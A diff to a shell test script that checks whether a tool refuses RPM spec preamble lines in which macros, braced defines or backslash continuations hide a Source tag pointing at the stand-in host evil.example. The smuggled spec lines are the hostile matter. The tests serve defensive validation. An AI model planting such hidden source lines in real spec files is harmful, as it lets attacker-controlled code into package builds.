@@ -548,6 +548,35 @@ sed -i "/^Version:/r $D/line" "$D/src/foo.spec"; fix
 refused record-cond-section PASS "foo.spec line 4: a preamble line a macro of the spec, an expression or a conditional body writes"
 fresh record-lead-host-own; sed -i '/^Version:/a %global s Source1: https://evil.example/x\n%{nil}%{s}' "$D/src/foo.spec"; fix
 refused record-lead-host-own PASS "foo.spec line 4: a preamble line a macro of the spec, an expression or a conditional body writes"
+# A braced define's argument ends at its brace and the line goes on; rpm's own braced
+# bcond writes nothing.
+braced=(
+  '%{?_vendor:%{global:b 1}Source2: https://evil.example/x}'
+  '%{nil}%{define:a 1}Source1: https://evil.example/x'
+  '%{define:c 1}Source3: https://evil.example/x'
+)
+for i in "${!braced[@]}"; do
+  fresh "record-braced-define-$i"; printf '%s\n' "${braced[$i]}" > "$D/line"
+  sed -i "/^Version:/r $D/line" "$D/src/foo.spec"; fix
+  refused "record-braced-define ${braced[$i]}" PASS "foo.spec line 3: a preamble line a macro of the spec, an expression or a conditional body writes"
+done
+fresh record-bcond-braced
+for s in src tgt; do sed -i '/^Version:/a %{bcond_with hpc}\n%{bcond_without tests}' "$D/$s/foo.spec"; done; fix
+recorded record-bcond-braced PASS
+# A macro in a tag's name, and a tag line a backslash continues, hide the tag rpm reads.
+named=(
+  'Source%{?_vendor:1}: https://evil.example/one.tar.gz'
+  'Source1%{nil}: https://evil.example/one.tar.gz'
+)
+for i in "${!named[@]}"; do
+  fresh "record-tag-name-macro-$i"; printf '%s\n' "${named[$i]}" > "$D/line"
+  sed -i "/^Version:/r $D/line" "$D/src/foo.spec"; fix
+  refused "record-tag-name-macro ${named[$i]}" PASS "foo.spec line 3: a preamble line with a macro before its colon, or one the next line continues"
+done
+fresh record-tag-backslash
+printf '%%global s Source1: https://evil.example/one.tar.gz\nBuildArch: noarch \\\n%%{s}\n' > "$D/line"
+sed -i "/^Version:/r $D/line" "$D/src/foo.spec"; fix
+refused record-tag-backslash PASS "foo.spec line 4: a preamble line with a macro before its colon, or one the next line continues"
 
 # A name both defined and set by its tag is not sure: rpm takes the later one.
 fresh record-define-and-tag
